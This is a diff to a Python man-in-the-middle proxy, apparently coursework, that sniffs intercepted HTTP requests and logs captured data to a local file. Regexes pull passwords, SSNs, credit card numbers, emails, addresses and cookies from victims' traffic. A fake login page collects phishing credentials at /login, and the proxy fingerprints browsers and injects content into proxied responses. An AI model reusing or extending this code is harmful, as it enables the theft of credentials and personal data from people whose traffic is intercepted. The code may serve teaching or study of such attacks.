@@ -41,67 +41,55 @@ def get_args():
 # HINT: info can be passed in the URL and headers too
 
 
-def get_info(pattern: re.Pattern[str], lines: list[str]) -> list[str]:
-    info = []
-
-    for line in lines:
-        match = pattern.search(line)
-
-        if match:
-            info.append(match.group(1))
-
-    return info
+def test_patterns(query_string, patterns: dict[str, re.Pattern]):
+    results = {}
+    for key, pattern in patterns.items():
+        match = pattern.search(query_string)
+        results[key] = match.group(1) if match else None
+    return results
 
 
 def passive(data: str, url: str):
-    print("[*] Searching for info in the request")
-    print("[@] Request: ", data)
+    patterns = {
+        "username": re.compile(r"\buser(?:name)?=(.*?)(?:&|$)"),
+        "password": re.compile(r"(?:password|pwd|pass)=(.*?)(?:&|$)"),
+        "zip": re.compile(r"(?:zip|zipcode)=(.*?)(?:&|$)"),
+        "state": re.compile(r"(?:state|province|region|st)=(.*?)(?:&|$)"),
+        "city": re.compile(r"\bcity=(.*?)(?:&|$)"),
+        "phone_param": re.compile(r"(?:phone|telephone|mobile)=(.*?)(?:&|$)"),
+        "phone": re.compile(r"\b((\(\d{3}\)\s?|\d{3}[-.\s])?\d{3}[-.\s]\d{4})\b"),
+        "ssn": re.compile(r"(?:ssn|social|security|social-security)=(.*?)(?:&|$)"),
+        "address": re.compile(r"(?:address|addr)=(.*?)(?:&|$)"),
+        "birthday": re.compile(r"(?:birthday|bday)=(.*?)(?:&|$)"),
+        "last": re.compile(r"(?:last|surname|lastname|lname)=(.*?)(?:&|$)"),
+        "first": re.compile(r"(?:first|firstname|fname)=(.*?)(?:&|$)"),
+        "email_param": re.compile(r"(?:email|e-mail|mail)=(.*?)(?:&|$)"),
+        "email": re.compile(r"\b([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})\b"),
+        "credit_card": re.compile(r"\b((?:\d{4}[- ]?){3}\d{4})\b"),
+        "credit_card_param": re.compile(r"(?:credit-card|creditcard)=(.*?)(?:&|$)"),
+        "ssn": re.compile(r"\b(\d{3}-\d{2}-\d{4})\b"),
+        "ssn_param": re.compile(
+            r"(?:ssn|social|security|social-security)=(.*?)(?:&|$)"
+        ),
+        "name": re.compile(r"\b([A-Z][a-z]+ [A-Z][a-z]+)\b"),
+        "address": re.compile(
+            r"\b(\d+\s[A-Z][a-zA-Z\s]+,?\s[A-Z]{2}\s\d{5}(-\d{4})?)\b"
+        ),
+        "cookie": re.compile(r"(?:Cookie|Set-Cookie):\s?(.*)"),
+    }
 
-    search_lines = data.split("\r\n")
+    # Test the patterns
+    results = test_patterns(data, patterns)
 
-    username_pattern = re.compile(r"\buser(?:name)?=([^&\s]+)")
-    password_pattern = re.compile(r"\bpass(?:word)?=([^&\s]+)")
-    email_pattern = re.compile(r"\b([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})\b")
-    credit_card_pattern = re.compile(r"\b((?:\d{4}[- ]?){3}\d{4})\b")
-    ssn_pattern = re.compile(r"\b(\d{3}-\d{2}-\d{4})\b")
-    name_pattern = re.compile(r"\b([A-Z][a-z]+ [A-Z][a-z]+)\b")
-    address_pattern = re.compile(
-        r"\b(\d+\s[A-Z][a-zA-Z\s]+,?\s[A-Z]{2}\s\d{5}(-\d{4})?)\b"
-    )
-    phone_pattern = re.compile(r"\b((\(\d{3}\)\s?|\d{3}[-.\s])?\d{3}[-.\s]\d{4})\b")
-    cookie_pattern = re.compile(r"Cookie:\s?(.*)")
-
-    # Search for matches
-
-    usernames = get_info(username_pattern, search_lines)
-    passwords = get_info(password_pattern, search_lines)
-    emails = get_info(email_pattern, search_lines)
-    credit_cards = get_info(credit_card_pattern, search_lines)
-    ssns = get_info(ssn_pattern, search_lines)
-    name_pattern = get_info(name_pattern, search_lines)
-    address_pattern = get_info(address_pattern, search_lines)
-    phone_pattern = get_info(phone_pattern, search_lines)
-    cookies = get_info(cookie_pattern, search_lines)
-
-    # Log information (append to file)
+    # Print the results
     with file_lock:
         with open("info_1.txt", "a") as f:
             f.write(f"URL: {url}\n")
-            f.write(f"Emails: {emails}\n") if len(emails) > 0 else None
-            f.write(f"Usernames: {usernames}\n") if len(usernames) > 0 else None
-            f.write(f"Passwords: {passwords}\n") if len(passwords) > 0 else None
-            f.write(f"Credit Cards: {credit_cards}\n") if len(
-                credit_cards
-            ) > 0 else None
-            f.write(f"SSNs: {ssns}\n") if len(ssns) > 0 else None
-            f.write(f"Names: {name_pattern}\n") if len(name_pattern) > 0 else None
-            f.write(f"Addresses: {address_pattern}\n") if len(
-                address_pattern
-            ) > 0 else None
-            f.write(f"Phone Numbers: {phone_pattern}\n") if len(
-                phone_pattern
-            ) > 0 else None
-            f.write(f"Cookies: {cookies}\n") if len(cookies) > 0 else None
+
+            for key, value in results.items():
+                if value:
+                    f.write(f"{key}: {value}\n")
+
             f.write("\n")
 
 
@@ -213,7 +201,7 @@ def get_data(socket: socket):
     return data
 
 
-def get_body(socket: socket, length:int, _body=b"") -> bytes:
+def get_body(socket: socket, length: int, _body=b"") -> bytes:
     body = _body
 
     while len(body) < length:
@@ -248,23 +236,17 @@ def get_url(req: str) -> str:
     return None
 
 
-def get_query(req: str) -> dict[str, str]:
-    query = {}
+def extract_info(req: str) -> dict[str, str]:
+    patterns = {
+        "user-agent": re.compile(r"user-agent=(.*?)(?:&|$|\s)"),
+        "screen": re.compile(r"screen=(.*?)(?:&|$|\s)"),
+        "lang": re.compile(r"lang=(.*?)(?:&|$|\s)"),
+        "username": re.compile(r"username=\s*(.*?)(?:&|$|\s)"),
+        "password": re.compile(r"password=\s*(.*?)(?:&|$|\s)"),
+    }
 
-    url = unquote(req.split("\r\n")[0].split(" ")[1])
-
-    return query_params(urlparse(url).query)
-
-
-def query_params(req: str) -> dict[str, str]:
-    query = {}
-
-    for param in req.split("&"):
-        key, value = param.split("=")
-        query[key] = value
-
-    return query
-
+    # Test the patterns
+    return test_patterns(req, patterns)
 
 def log_query(query: dict[str, str], msg: str):
     with file_lock:
@@ -272,7 +254,8 @@ def log_query(query: dict[str, str], msg: str):
             f.write(f"{msg}:\n")
 
             for key, value in query.items():
-                f.write(f"{key}: {value}\n")
+                if value:
+                    f.write(f"{key}: {unquote(value)}\n")
 
             f.write("\n")
 
@@ -376,7 +359,7 @@ def get_fake_login() -> bytes:
         <body>
             <div class="login-container">
                 <h2>Login</h2>
-                <form action="login" method="get">
+                <form action="login" method="post">
                     <input type="text" name="username" placeholder="Username" required>
                     <input type="password" name="password" placeholder="Password" required>
                     <button type="submit">Login</button>
@@ -392,8 +375,10 @@ def get_fake_login() -> bytes:
 
     return headers + b"\r\n\r\n" + body
 
+
 def get_method(req: str) -> str:
     return req.split("\r\n")[0].split(" ")[0]
+
 
 def get_content_length(req: str) -> int:
     match = re.search(r"Content-Length:\s*(\d+)", req)
@@ -402,6 +387,7 @@ def get_content_length(req: str) -> int:
         return int(match.group(1))
 
     return 0
+
 
 def handle_client(client_sock: socket, passive_mode: bool):
     try:
@@ -424,22 +410,21 @@ def handle_client(client_sock: socket, passive_mode: bool):
                 print("[!] No URL found...")
                 break
 
-            if passive_mode:
-                if method == "GET":
-                    passive(request, url)
-                elif method == "POST":
-                    body_length = get_content_length(request)
-                    body = get_body(client_sock, body_length).strip().decode("utf-8")
+            if method == "POST":
+                body_length = get_content_length(request)
+                body = get_body(client_sock, body_length)
 
-                    passive(request + body, url)
-                    
-                    # Update the client data with the body
-                    client_data = client_data + body.encode("utf-8")
+                client_data = client_data + body
+
+                request = request + body.strip().decode("utf-8")
+
+            if passive_mode:
+                passive(request, url)
             else:
                 if url == f"{args.address}:{args.port}":
                     print("[*] Obtained data from the client")
 
-                    log_query(get_query(request), "Fingerprint")
+                    log_query(extract_info(request), "Fingerprint")
 
                     client_sock.sendall(b"HTTP/1.1 200 OK\r\n\r\n")
                     break
@@ -450,13 +435,7 @@ def handle_client(client_sock: socket, passive_mode: bool):
                     if path == "/login":
                         print("[*] Received phishing login credentials")
 
-                        if method == "GET":
-                            log_query(get_query(request), "Phishing")
-                        elif method == "POST":
-                            body_length = get_content_length(request)
-                            body = get_body(client_sock, body_length).decode("utf-8")
-
-                            log_query(query_params(body), "Phishing")
+                        log_query(extract_info(request), "Phishing")
 
                         res = get_phishing_response()
                     elif path == "/" or path == "":
@@ -490,9 +469,8 @@ def handle_client(client_sock: socket, passive_mode: bool):
             body_length = get_content_length(headers)
 
             if body_length > 0:
-                print(f"[*] Actual content length: {body_length} vs {len(body)}")
                 body = get_body(proxy_socket, body_length, body)
-            
+
             body, encoding = decode_body(headers, body)
 
             if passive_mode:
@@ -509,10 +487,6 @@ def handle_client(client_sock: socket, passive_mode: bool):
                     + b"\r\n\r\n"
                     + injected
                 )
-            # TODO: the response from the server needs to be retrieved, the get data method gets just the headers
-            # plus a small portion of the body, the rest of the body needs to be retrieved with the method used in
-            # the request for the POST
-            print(response_data)
 
             client_sock.sendall(response_data)
     except Exception as e:
